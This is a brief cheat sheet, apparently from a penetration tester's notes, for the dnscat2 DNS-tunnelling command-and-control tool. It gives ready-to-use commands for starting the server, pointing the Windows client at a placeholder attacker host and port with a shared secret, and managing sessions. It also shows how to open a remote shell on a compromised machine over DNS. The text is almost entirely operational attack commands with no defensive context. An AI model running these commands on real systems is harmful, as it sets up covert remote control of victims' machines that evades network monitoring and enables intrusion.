### Source
https://github.com/iagox86/dnscat2  

### Start server without specific domain
```
ruby dnscat2.rb
```

### Start exe client
```
.\dnscat2 --dns server=<lhost>,port=<lport> --secret=<secret>
```

### Start server for interaction with dnscat2-powershell
```
ruby dnscat2.rb --security=open --no-cache --dns domain=<domain>
```


### List sessions
```
dns> session
```

### Interact with session
```
dns> session -i <id>
```

### Start shell
```
shell
CTRL + z
dns> session -i <newId>
```

